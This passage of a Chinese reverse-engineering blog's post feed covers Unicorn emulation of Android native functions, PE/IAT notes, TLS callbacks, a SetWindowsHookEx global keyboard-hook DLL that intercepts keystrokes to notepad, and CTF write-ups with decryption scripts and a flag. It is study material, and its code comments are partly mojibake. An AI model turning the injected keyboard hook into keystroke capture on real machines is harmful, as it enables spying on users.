androidemu.java.helpers.native_method import native_method from UnicornTraceDebugger import udbg from androidemu.emulator import Emulator from androidemu.utils import memory_helpers # 配置logging logging.basicConfig( stream=sys.stdout, level=logging.DEBUG, format=&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot; ) # 用于打印调试信息 logger = logging.getLogger(__name__) # 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器 @native_method def __aeabi_memclr(mu,addr,size): mu.mem_write(addr,bytes(size)) print(&#39;__aeabi_memclr_ptr (addr:%x,size:%d)&#39; % (addr,size)) @native_method def __aeabi_memcpy(mu,dist,source,size): data = mu.mem_read(source,size) mu.mem_write(dist,bytes(data)) print(&#39;__aeabi_memcpy (dist:%x,source:%x)&#39; % (dist,source)) @native_method def sprintf(mu,buffer,format,arg1,arg2): format1 = memory_helpers.read_utf8(mu,format) data1 = memory_helpers.read_utf8(mu,arg1) res = format1 % (data1,arg2) mu.mem_write(buffer,bytes((res+&#39;\\x00&#39;).encode(&#39;utf-8&#39;))) print(&#39;sprintf (%s)&#39; % (format)) # 创建模拟器 emulator = Emulator() # 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容 # 在导入so文件之前hook才生效，导入之后没法hook emulator.modules.add_symbol_hook(&#39;__aeabi_memclr&#39;, emulator.hooker.write_function(__aeabi_memclr) + 1) emulator.modules.add_symbol_hook(&#39;__aeabi_memcpy&#39;, emulator.hooker.write_function(__aeabi_memcpy) + 1) emulator.modules.add_symbol_hook(&#39;sprintf&#39;, emulator.hooker.write_function(sprintf) + 1) # 加载相关so文件 # do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作， # 这可能会涉及更多库的调用 emulator.load_library(&#39;./lib/libc.so&#39;,do_init=False) libnat_mod = emulator.load_library(&#39;./lib/libnative-lib.so&#39;,do_init=False) # 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址 dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL) # 开始执行想要执行的jni函数 try: # 根据so模块调用指定的函数，后面都是函数的参数 # 参数1: JNIEnv # 参数2: 是java类的对象，这里填0即可 # 参数3: 是函数输入字符串 sign = emulator.call_symbol(libnat_mod,&#39;Java_com_sec_udemo_MainActivity_sign_1lv2&#39;, emulator.java_vm.jni_env.address_ptr,0,&#39;123&#39;) print(sign) except UcError as e: # 打印调用栈 tracks = dbg.get_tracks() # 这里打印调用地址即可，打印后100条 for addr in tracks[-100:-1]: print(hex(addr - 0xcbc66000)) print(e)","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"前置知识学习","slug":"re/前置知识学习","permalink":"https://pa1r0t.github.io/categories/re/%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"unicorn","slug":"unicorn","permalink":"https://pa1r0t.github.io/tags/unicorn/"}]},{"title":"unicorn_learning2","slug":"unicorn-learning2","date":"2022-12-30T01:40:33.000Z","updated":"2024-06-25T14:03:37.355Z","comments":true,"path":"2022/12/30/unicorn-learning2/","link":"","permalink":"https://pa1r0t.github.io/2022/12/30/unicorn-learning2/","excerpt":"unicorn start 用unicorn调用so文件中的某个函数，观察函数的输入与输出","text":"unicorn start 用unicorn调用so文件中的某个函数，观察函数的输入与输出 目标hook so文件中的sign1函数的输出与输入 这个函数内部调用了两个函数，tea_encrypt和sprintf，这两个函数中tea_encrypt函数只需要修复got表项即可调用tea_encrypt，但是sprintf函数不行 这里我们开始实验 创建虚拟机由于这里的指令都是两个字节为一条指令 所以这里为thumb指令集 def test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB) # 创建代码 # 其它代码添加到此处 return mu except UcError as e: print(&quot;ERROR: %s&quot; % e) mu = test_arm() # mu就是arm虚拟机 建立内存映射+写入数据由于这是要模拟执行一段函数，所以要建立镜像区，栈区，数据段区的内存 这里各个区的大小存粹靠估算 image = open(&#39;./libnative-lib.so&#39;,&#39;rb&#39;).read() # 镜像内存 image_base = 0x0 mu.mem_map(image_base, 0x10000*8) # 这里大小自己估算 mu.mem_write(image_base,image) # 栈内存 stack_base = 0xa0000 stack_size = 0x10000 * 3 mu.mem_map(stack_base, stack_size) # 这里大小自己估算 stack_top = stack_base + stack_size - 0x4 mu.reg_write(UC_ARM_REG_SP,stack_top) # 数据段内存 a1 = b&#39;123&#39; data_base = 0xf0000 data_size = 0x10000 * 3 mu.mem_map(data_base, data_size) # 这里大小自己估算 mu.mem_write(data_base,a1) 这里栈区的sp指针应小于栈大小的0x4，防止栈溢出，这里我们将‘123’字符串写入数据段，来作为函数的参数使用 添加hook函数主要用于程序报错时可以及时追踪到哪里有问题 def hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size)) def hook_memory(uc, access, address, size,value, userdata): pc = uc.reg_read(UC_ARM_REG_PC) print (&quot;memory error: pc:%x address:%x size:%x&quot; % (pc, address, size)) mu.hook_add(UC_HOOK_CODE,hook_code,0) mu.hook_add(UC_HOOK_MEM_UNMAPPED,hook_memory,0) 开始执行#开始执行虚拟机 start_addr = 0x9B68 end_addr = 0x9C2C try: mu.emu_start(start_addr, end_addr) R2 = mu.reg_read(UC_ARM_REG_R2) res = mu.mem_read(R2,16) print(binascii.b2a_hex(res)) except UcError as e: print(e) 结果只运行到第一条指令： 这里将开始地址+1，然后执行： 然后这里就遇到了函数地址外的地址，很奇怪！！！，这里找到0x91ac,也就是最后一次正常的地方，发现来到了plt表，点击后又来到got表，这里的got表其实是ida已经自动补全了，unicorn需要自己手动补全 补全后： 执行代码： #开始执行虚拟机 start_addr = 0x9B68 end_addr = 0x9C2C try: # 添加got表 mu.mem_write(0x1EDB0,b&#39;\\xD9\\x98\\x00\\x00&#39;) mu.emu_start(start_addr+1, end_addr) R2 = mu.reg_read(UC_ARM_REG_R2) res = mu.mem_read(R2,16) print(binascii.b2a_hex(res)) except UcError as e: print(e) 最后代码：from unicorn import * from unicorn.arm_const import * import binascii def hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size)) def hook_memory(uc, access, address, size,value, userdata): pc = uc.reg_read(UC_ARM_REG_PC) print (&quot;memory error: pc:%x address:%x size:%x&quot; % (pc, address, size)) def test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB) # 创建代码 # 其它代码添加到此处 return mu except UcError as e: print(&quot;ERROR: %s&quot; % e) mu = test_arm() # mu就是arm虚拟机 image = open(&#39;./libnative-lib.so&#39;,&#39;rb&#39;).read() # 镜像内存 image_base = 0x0 mu.mem_map(image_base, 0x10000*8) # 这里大小自己估算 mu.mem_write(image_base,image) # 栈内存 stack_base = 0xa0000 stack_size = 0x10000 * 3 mu.mem_map(stack_base, stack_size) # 这里大小自己估算 stack_top = stack_base + stack_size - 0x4 mu.reg_write(UC_ARM_REG_SP,stack_top) # 数据段内存 a1 = b&#39;123&#39; data_base = 0xf0000 data_size = 0x10000 * 3 mu.mem_map(data_base, data_size) # 这里大小自己估算 mu.mem_write(data_base,a1) #函数参数通过数据段传递 寄存器是R0 mu.reg_write(UC_ARM_REG_R0,data_base) # 添加hook函数 # mu.hook_add(UC_HOOK_CODE,hook_code,0) # mu.hook_add(UC_HOOK_MEM_UNMAPPED,hook_memory,0) #开始执行虚拟机 start_addr = 0x9B68 end_addr = 0x9C2C try: # 添加got表 mu.mem_write(0x1EDB0,b&#39;\\xD9\\x98\\x00\\x00&#39;) mu.emu_start(start_addr+1, end_addr) R2 = mu.reg_read(UC_ARM_REG_R2) res = mu.mem_read(R2,16) print(binascii.b2a_hex(res)) except UcError as e: print(e)","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"前置知识学习","slug":"re/前置知识学习","permalink":"https://pa1r0t.github.io/categories/re/%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"unicorn","slug":"unicorn","permalink":"https://pa1r0t.github.io/tags/unicorn/"}]},{"title":"unicorn_learning1","slug":"unicorn1","date":"2022-12-29T06:32:54.000Z","updated":"2024-06-25T14:04:12.428Z","comments":true,"path":"2022/12/29/unicorn1/","link":"","permalink":"https://pa1r0t.github.io/2022/12/29/unicorn1/","excerpt":"unicorn start! 效仿大佬的文章简单地给自己作个学习记录，就当作写了篇日记了","text":"unicorn start! 效仿大佬的文章简单地给自己作个学习记录，就当作写了篇日记了 Unicorn 入门学习unicorn 是用于执行多种cpu框架的虚拟架构系统 下面进行模仿arm架构，执行arm指令首先在python中导入unicorn from unicorn import * 如何根据自己要执行指令对应哪个cpu架构，来导入相应的处理器相关的常量 from unicorn.arm_const import * from unicorn.arm64_const import * from unicorn.m68k_const import * from unicorn.mips_const import * from unicorn.sparc_const import * from unicorn.x86_const import * 寄存器常量命名规则：UC_ + 指令集 + REG + 大写寄存器名UC_ARMREG + 大写寄存器名 （UC_ARM_REG_R0）UC_X86REG + 大写寄存器名 （UC_X86_REG_EAX） 这里我们选择unicorn.arm_const 创建arm虚拟机（UC）Uc 是unicorn的主类，Uc对象则代表了一个独立的虚拟机实例，它有独立的寄存器和内存等资源，不同Uc对象之间的数据是独立的。Uc的构造函数有两个参数 arch 和 mode，用来指定模拟执行的指令集和对应的位数或模式。arch常量参数一般以 UCARCH 开头，MODE常量以UCMODE 开头。 # Test ARM def test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_ARM) # 创建代码 # 其它代码添加到此处 return mu except UcError as e: print(&quot;ERROR: %s&quot; % e) mu = test_arm() # mu就是arm虚拟机 映射内存想用Unicorn模拟执行代码，是不能将代码字节流直接以参数形式传递给Unicorn，而是将要执行的代码写入到Unicorn 的虚拟内存中。Uc 虚拟机实例初始内存是没有任何映射的，在读写内存之前使用uc_mem_map函数映射一段内存 这里开始地址和地址大小都要和0x1000&#x3D;&#x3D;对齐&#x3D;&#x3D; 否则就是我这种错误： ADDRESS = 0x10000 mu.mem_map(ADDRESS, 0x1000) # 这里大小自己估算 写入代码将想要执行的代码写进我们创建的内存中 mem_write的第二个参数必须是byte字节数组，只支持python的byte数组，不能是String或者bytearray。 ARM_CODE = b&quot;\\x37\\x00\\xa0\\xe3\\x03\\x10\\x42\\xe0&quot; # mov r0, #0x37; # sub r1, r2, r3 mu.mem_write(ADDRESS, ARM_CODE) 给寄存器初始赋值 mu.reg_write(UC_ARM_REG_R0, 0x0) mu.reg_write(UC_ARM_REG_R2, 0x4) mu.reg_write(UC_ARM_REG_R3, 0x1) # 这里r1的结果预估是0x3 添加指令级的Hookhook类型： 指令执行类： UC_HOOK_INTR UC_HOOK_INSN UC_HOOK_CODE UC_HOOK_BLOCK 内存访问类： UC_HOOK_MEM_READ UC_HOOK_MEM_WRITE UC_HOOK_MEM_FETCH UC_HOOK_MEM_READ_AFTER UC_HOOK_MEM_PROT UC_HOOK_MEM_FETCH_INVALID UC_HOOK_MEM_INVALID UC_HOOK_MEM_VALID 异常处理类： UC_HOOK_MEM_READ_UNMAPPED UC_HOOK_MEM_WRITE_UNMAPPED UC_HOOK_MEM_FETCH_UNMAPPED def hook_add(self, htype, callback, user_data=None, begin=1, end=0, arg1=0): pass mu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=0x1000) 以上是添加hook的操作 在begin…end范围内的每一条指令被执行前都会调用callback。 hook函数编写： # callback for tracing instructions def hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size)) 执行虚拟机emu_start 可以通过timeout参数设置最长执行时长，防止线程死在虚拟机里面。emu_start 执行完成后，可以通过读取内存或寄存器的方式来获取执行结果。 def emu_start(self, begin, until, timeout=0, count=0): pass mu.emu_start(ADDRESS, ADDRESS + len(ARM_CODE)) 执行成功，hook函数一共被调用两次（指令有两条） 获取寄存器结果r0 = mu.reg_read(UC_ARM_REG_R0) r1 = mu.reg_read(UC_ARM_REG_R1) print(&quot;&gt;&gt;&gt; R0 = 0x%x&quot; % r0) print(&quot;&gt;&gt;&gt; R1 = 0x%x&quot; % r1) 和推理的结果相同！！！！ 个人测试全过程： 完整代码： from unicorn import * from unicorn.arm_const import * ARM_CODE = b&quot;\\x37\\x00\\xa0\\xe3\\x03\\x10\\x42\\xe0&quot; # mov r0, #0x37; # sub r1, r2, r3 # Test ARM # callback for tracing instructions def hook_code(uc, address, size, user_data): print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size)) def test_arm(): print(&quot;Emulate ARM code&quot;) try: # Initialize emulator in ARM mode mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB) # map 2MB memory for this emulation ADDRESS = 0x10000 mu.mem_map(ADDRESS, 2 * 0x10000) mu.mem_write(ADDRESS, ARM_CODE) mu.reg_write(UC_ARM_REG_R0, 0x1234) mu.reg_write(UC_ARM_REG_R2, 0x6789) mu.reg_write(UC_ARM_REG_R3, 0x3333) mu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=ADDRESS) # emulate machine code in infinite time mu.emu_start(ADDRESS, ADDRESS + len(ARM_CODE)) r0 = mu.reg_read(UC_ARM_REG_R0) r1 = mu.reg_read(UC_ARM_REG_R1) print(&quot;&gt;&gt;&gt; R0 = 0x%x&quot; % r0) print(&quot;&gt;&gt;&gt; R1 = 0x%x&quot; % r1) except UcError as e: print(&quot;ERROR: %s&quot; % e) 文章引用Pandaos大佬的文章：[原创] Unicorn 在 Android 的应用-Android安全-看雪论坛-安全社区|安全招聘|bbs.pediy.com","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"前置知识学习","slug":"re/前置知识学习","permalink":"https://pa1r0t.github.io/categories/re/%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"unicorn","slug":"unicorn","permalink":"https://pa1r0t.github.io/tags/unicorn/"}]},{"title":"re_base3","slug":"re-base3","date":"2022-12-22T11:33:01.000Z","updated":"2024-06-25T14:02:56.953Z","comments":true,"path":"2022/12/22/re-base3/","link":"","permalink":"https://pa1r0t.github.io/2022/12/22/re-base3/","excerpt":"PE and IAT hook","text":"PE and IAT hook PE由于了解IAT,需要了解一点PE,这里把PE也给写了吧 PE文件种类： OBJ文件不能执行，dll和sys文件需要调试器执行或者服务和程序加载执行 DOS签名和PE签名 PE文件大体分为：1.PE头、2.PE体 1.PE头 DOS签名 DOS存根 NT头 一系列节区头 .data(数据) .text(代码) .rsrc(资源) 2.PE体：一系列节区 名词介绍： ​ VA:virtual address 绝对虚拟内存地址 ​ RVA:相对虚拟内存地址 ​ VA &#x3D; RVA + imageBase DOS头结构体：唯一有用的就是e_magic和e_lfanew 其中e_magic就是Dos签名，e_lfanew就是NT头的偏移 DOS存根Dos存根是兼容dos系统的一种产物，可有可无，内容可用xp内置debug查看 内容是一段汇编代码，在dos系统中执行 NT头NT头结构体 签名不作介绍，文件头结构体： Machine代表cpu类别 SizeOfOptionalHeader是表示可选头的大小 Characteristics表示文件是否是dll，是否可执行 NT可选头结构体： NT可选头非常重要，它记录了很多重要的数据 ImageBase，是映像基址，映像指的是PE文件加载到内存的一种形态（我觉得更像是一种叫法），映像基址定义了文件加载进内存的基础地址 SectionAlignment, 节区对齐是文件在内存中的最小单位，文件在内存的大小应该是这个值的整数倍 FileAlignment, 文件对齐是文件在磁盘中的最小单位，文件在磁盘的大小应该是这个值的整数倍 Subsystem,子系统用来区分文件是sys驱动文件还是exe可执行文件 NumberOfRvaAndSizes , 记录DataDirectory数组的个数 DataDirectory： 节区头结构体： 这里的VirtualAddress是用RVA表示的 RAV to RAWRAW就是文件中节区的偏移（非内存） IAT导入地址表映像导入描述结构体： 文件导入多少个库文件，就有多少个 image_import_descriptor结构体 &#x3D;&#x3D;该结构体的地址保存在image_optional_header32.DataDirectory[1].VirtualAddress中&#x3D;&#x3D; INT结构体保存着Image_import_by_name的指针 结构图： PE装载器将导入函数加载到IAT的顺序： EAT不想写了，和IAT差不多，一个导入一个导出 它的查找数据先是image_optional_header32.DataDirectory[0].VirtualAddress找到这个结构体，然后根据要找的函数名去AddressOfNames数组里面拿到下标，然后用下标再去Oridinal数组找，找到下标又去AddressOfFunction那里找函数地址 没有函数名直接用Ordinal查找，Ordinal数组存在的意义是我忘了。。反正就这样 IAT hook","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"前置知识学习","slug":"re/前置知识学习","permalink":"https://pa1r0t.github.io/categories/re/%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"re_base2","slug":"re-base2","date":"2022-12-21T13:56:29.000Z","updated":"2024-06-25T14:02:49.260Z","comments":true,"path":"2022/12/21/re-base2/","link":"","permalink":"https://pa1r0t.github.io/2022/12/21/re-base2/","excerpt":"TLS and keyboard hooking","text":"TLS and keyboard hooking TLS回调TLS(Thread Local Storage) 线程本地存储，主要用于提供本地线程访问局部数据的句柄。 下面来一段官方解释： 使用线程本地存储 （TLS），可以为进程可以使用全局索引访问的每个线程提供唯一数据。一个线程分配索引，其他线程可以使用它来检索与索引关联的唯一数据 原理图： &#x3D;&#x3D;TLS主要用于程序的反调试检测&#x3D;&#x3D; 它在运行EP（entrypoint 程序入口代码）代码前执行 TLS结构体： 可以看到TLS结构体中保存着回调函数的地址 可以打开CFF explore软件直接查看存放TLS回调函数数组的地址 打开od查看它的地址为401000 汇编直接定位过去就出来了 TLS回调函数是在进程或线程创建或终止时调用，如果某个进程存在一个线程，那从程序的创建到销毁需要4次调用回调函数 TLS回调函数定义： 注册TLS程序示例代码： #include &lt;windows.h&gt; #pragma comment(linker, &quot;/INCLUDE:__tls_used&quot;) void print_console(char* szMsg) &#123; HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE); WriteConsoleA(hStdout, szMsg, strlen(szMsg), NULL, NULL); &#125; void NTAPI TLS_CALLBACK1(PVOID DllHandle, DWORD Reason, PVOID Reserved) &#123; char szMsg[80] = &#123;0,&#125;; wsprintfA(szMsg, &quot;TLS_CALLBACK1() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason); print_console(szMsg); &#125; void NTAPI TLS_CALLBACK2(PVOID DllHandle, DWORD Reason, PVOID Reserved) &#123; char szMsg[80] = &#123;0,&#125;; wsprintfA(szMsg, &quot;TLS_CALLBACK2() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason); print_console(szMsg); &#125; #pragma data_seg(&quot;.CRT$XLX&quot;) PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, TLS_CALLBACK2, 0 &#125;; #pragma data_seg() DWORD WINAPI ThreadProc(LPVOID lParam) &#123; print_console(&quot;ThreadProc() start\\n&quot;); print_console(&quot;ThreadProc() end\\n&quot;); return 0; &#125; int main(void) &#123; HANDLE hThread = NULL; print_console(&quot;main() start\\n&quot;); hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); WaitForSingleObject(hThread, 60*1000); CloseHandle(hThread); print_console(&quot;main() end\\n&quot;); return 0; &#125; 调试TLS回调函数直接在运行前设置调试选项 添加TLS这里不做阐述 keyboard hooking消息钩取工作原理 使用SetWindowsHookEx()可以实现消息钩子，钩子函数需要存在于dll文件中，由操作系统调用回调函数 API定义： 在某进程拥有消息，操作系统就会将dll注入进程序中，实现消息钩取 只需要一个程序加载安装钩子所在的dll程序，然后SetWindowsHookEx()注册钩子，操作系统就会检测每一个程序的行为，一旦发生键盘输入，就将dll文件注入。 加载dll注册hook实例： #include &quot;stdio.h&quot; #include &quot;conio.h&quot; #include &quot;windows.h&quot; #define DEF_DLL_NAME &quot;KeyHook.dll&quot; #define DEF_HOOKSTART &quot;HookStart&quot; #define DEF_HOOKSTOP &quot;HookStop&quot; typedef void (*PFN_HOOKSTART)(); typedef void (*PFN_HOOKSTOP)(); void main() &#123; HMODULE hDll = NULL; PFN_HOOKSTART HookStart = NULL; PFN_HOOKSTOP HookStop = NULL; char ch = 0; // KeyHook.dll 肺爹 hDll = LoadLibraryA(DEF_DLL_NAME); if( hDll == NULL ) &#123; printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError()); return; &#125; // export 窃荐 林家 掘扁 HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART); HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP); // 饶欧 矫累 HookStart(); // 荤侩磊啊 &#39;q&#39; 甫 涝仿且 锭鳖瘤 措扁 printf(&quot;press &#39;q&#39; to quit!\\n&quot;); while( _getch() != &#39;q&#39; ) ; // 饶欧 辆丰 HookStop(); // KeyHook.dll 攫肺爹 FreeLibrary(hDll); &#125; dll代码： #include &quot;stdio.h&quot; #include &quot;windows.h&quot; #define DEF_PROCESS_NAME &quot;notepad.exe&quot; HINSTANCE g_hInstance = NULL; HHOOK g_hHook = NULL; HWND g_hWnd = NULL; BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved) &#123; switch( dwReason ) &#123; case DLL_PROCESS_ATTACH: g_hInstance = hinstDLL; break; case DLL_PROCESS_DETACH: break; &#125; return TRUE; &#125; LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) &#123; char szPath[MAX_PATH] = &#123;0,&#125;; char *p = NULL; if( nCode &gt;= 0 ) &#123; // bit 31 : 0 =&gt; press, 1 =&gt; release if( !(lParam &amp; 0x80000000) ) &#123; GetModuleFileNameA(NULL, szPath, MAX_PATH); p = strrchr(szPath, &#39;\\\\&#39;); // 泅犁 橇肺技胶 捞抚阑 厚背秦辑 父距 notepad.exe 扼搁 0 酒囱 蔼阑 府畔窃 // =&gt; 0 酒囱 蔼阑 府畔窍搁 皋矫瘤绰 促澜栏肺 傈崔登瘤 臼澜 if( !_stricmp(p + 1, DEF_PROCESS_NAME) ) return 1; &#125; &#125; // 老馆利牢 版快俊绰 CallNextHookEx() 甫 龋免窍咯 // 览侩橇肺弊伐 (趣篮 促澜 扰) 栏肺 皋矫瘤甫 傈崔窃 return CallNextHookEx(g_hHook, nCode, wParam, lParam); &#125; #ifdef __cplusplus extern &quot;C&quot; &#123; #endif __declspec(dllexport) void HookStart() &#123; g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0); &#125; __declspec(dllexport) void HookStop() &#123; if( g_hHook ) &#123; UnhookWindowsHookEx(g_hHook); g_hHook = NULL; &#125; &#125; #ifdef __cplusplus &#125; #endif 调试hook用字符串搜索直接定位到main函数 上面得到hookStart地址，然后call，F7直接步入就能进入hookstart函数 这里就是dll中注册键盘hook 直接根据注册时得到的地址进行跳转就能得到hook函数 也可以打开notepad，进行附加attach，先摁F9，让hook注册成功 然后在新加一个模块处停止，option设置 附加后在键盘输入字母，od会立马断住。","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"前置知识学习","slug":"re/前置知识学习","permalink":"https://pa1r0t.github.io/categories/re/%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"syc_level7","slug":"syc-level7","date":"2022-12-20T03:30:36.000Z","updated":"2024-06-25T14:03:30.411Z","comments":true,"path":"2022/12/20/syc-level7/","link":"","permalink":"https://pa1r0t.github.io/2022/12/20/syc-level7/","excerpt":"syc_level7 这种异常处理的catch代码一开始不会找，后来看了三叶草的战队的解答才知道怎么操作","text":"syc_level7 这种异常处理的catch代码一开始不会找，后来看了三叶草的战队的解答才知道怎么操作 这里有四个throw块，要找到对应catch代码，然后jmp过去就能看见源码，三叶草那边的解答是手撸汇编代码，说实话这种分析太慢，而且容易出错，还不如让ida来帮我们分析 转到卡片形式汇编代码，有这种标志的就是catch代码 然后将所有的catch块打上断点 然后在throw代码之前也都打上断点 然后，运行程序找到，各个throw对应的catch块 修改throw代码为jmp 对应catch地址，直接看到源码 这里随机数，大循环32次每一次要重置srand，小循环四次，所以只需要输出4个随机数即可 这里用c语言中的srand代码生成随机数，值得注意的是，&#x3D;&#x3D;我在windows上用c语言跑，跑出来的随机数根本不对。要在linux上面跑才行&#x3D;&#x3D; 这里根据随机数，标上代码块的执行顺序 最后python伪代码： enc = [0xA3A7C060, 0xEE6E5485, 0x244B2655, 0x318482D9] delta = 0x9E3779B9 for i in range(32): v11 += delta v12 += delta v7 += ((v8 &gt;&gt; 5) + 6) ^ (v8 + v11) ^ (16 * v8 + 8) ^ (i + v11) v9 += ((v10 &gt;&gt; 5) + 6) ^ (v10 + v12) ^ (16 * v10 + 8) ^ (i + v12) v8 += ((v7 &gt;&gt; 5) + 7) ^ (v7 + v11) ^ (16 * v7 + 9) ^ (i + v11) v10 += ((v9 &gt;&gt; 5) + 7) ^ (v9 + v12) ^ (16 * v9 + 9) ^ (i + v12) v19 = v7 ^ HIBYTE(delta) v20 = v8 ^ BYTE2(delta) v21 = v9 ^ BYTE1(delta) v22 = v10 ^ (unsigned __int8)delta 然后根据这个代码写出解密脚本： # lesson7 from Crypto.Util.number import * enc = [0xA3A7C060, 0xEE6E5485, 0x244B2655, 0x318482D9] delta = 0x9E3779B9 s = (delta*32)&amp;0xffffffff v7 = enc[0]^0x9e v8 = enc[1]^0x37 v9 = enc[2]^0x79 v10 = enc[3]^0xb9 for i in range(31,-1,-1): v10 -= ((v9 &gt;&gt; 5) + 7) ^ (v9 + s) ^ (16 * v9 + 9) ^ (i + s) v10 = v10&amp;0xffffffff v8 -= ((v7 &gt;&gt; 5) + 7) ^ (v7 + s) ^ (16 * v7 + 9) ^ (i + s) v8 = v8&amp;0xffffffff v9 -= ((v10 &gt;&gt; 5) + 6) ^ (v10 + s) ^ (16 * v10 + 8) ^ (i + s) v9 = v9&amp;0xffffffff v7 -= ((v8 &gt;&gt; 5) + 6) ^ (v8 + s) ^ (16 * v8 + 8) ^ (i + s) v7 = v7&amp;0xffffffff s = (s-delta)&amp;0xffffffff enc = [v7,v8,v9,v10] flag = int(&#39;&#39;.join(map(lambda x: hex(x)[2:],enc)),16) long_to_bytes(flag) #SYC&#123;ediGegTEaEi&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"赛题复现wp","slug":"ctf/赛题复现wp","permalink":"https://pa1r0t.github.io/categories/ctf/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0wp/"}],"tags":[]},{"title":"syc_level5","slug":"syc-level5","date":"2022-12-19T13:02:09.000Z","updated":"2024-06-25T14:03:24.783Z","comments":true,"path":"2022/12/19/syc-level5/","link":"","permalink":"https://pa1r0t.github.io/2022/12/19/syc-level5/","excerpt":"emmmmmmmmmmm,第一次做到魔改aes，有点激动记录一下吧","text":"emmmmmmmmmmm,第一次做到魔改aes，有点激动记录一下吧 魔改AES 这里做21次操作。但是无列混淆 第一次做这种魔改aes，逆着就是先行移位，原先怎么移动，就逆回去 然后再字节替换，也可以逆 然后再轮密钥加，这个要从后往前，不然会影响字节替换，字节替换是必须要有顺序的 最后就是每一个密文块的初始异或，该题除了第一块，其他都是拿密文块作为密匙 结果： # lesson5 def row_re(i): # 第二行 v1 = a1[13+i*16] a1[13+i*16] = a1[9+i*16] a1[9+i*16] = a1[5+i*16] a1[5+i*16] = a1[1+i*16] a1[1+i*16] = v1 # 第三行 不变 v2 = a1[2+i*16] a1[2+i*16] = a1[10+i*16] a1[10+i*16] = v2 v3 = a1[6+i*16] a1[6+i*16] = a1[14+i*16] a1[14+i*16] = v3 # 第四行 v4 = a1[15+i*16] a1[15+i*16] = a1[3+i*16] a1[3+i*16] = a1[7+i*16] a1[7+i*16] = a1[11+i*16] a1[11+i*16] = v4 a1 = [0xF8, 0x88, 0x9D, 0x31, 0xC7, 0x24, 0xD5, 0xF9, 0x45, 0x28, 0x9B, 0x7D, 0x42, 0x66, 0x65, 0x29, 0x2E, 0xC3, 0xC3, 0x5F, 0x1E, 0x1C, 0x43, 0xE9, 0x1E, 0xE1, 0xB9, 0xBD, 0x85, 0x5B, 0x7A, 0x39, 0xDE, 0xF6, 0xA7, 0xB8, 0xF5, 0xD2, 0xF9, 0xFE, 0xD9, 0xA0, 0x13, 0xF3, 0x43, 0xEF, 0xB2, 0x8A] key_t = [0x58, 0x2F, 0x36, 0xDD, 0x92, 0xF2, 0x79, 0x09, 0xC8, 0x73, 0x6F, 0x0A, 0x36, 0x14, 0x6F, 0x43, 0xB7, 0x1A, 0x21, 0xD0, 0x25, 0xE8, 0x58, 0xD9, 0xED, 0x9B, 0x37, 0xD3, 0xDB, 0x8F, 0x58, 0x90, 0x55, 0x7D, 0x4C, 0x5C, 0x70, 0x95, 0x14, 0x85, 0x9D, 0x0E, 0x23, 0x56, 0x46, 0x81, 0x7B, 0xC6, 0x6C, 0xF6, 0x8D, 0x4F, 0x1C, 0x63, 0x99, 0xCA, 0x81, 0x6D, 0xBA, 0x9C, 0xC7, 0xEC, 0xC1, 0x5A, 0xA5, 0x79, 0x86, 0x50, 0xB9, 0x1A, 0x1F, 0x9A, 0x38, 0x77, 0xA5, 0x06, 0xFF, 0x9B, 0x64, 0x5C, 0x10, 0xBF, 0x28, 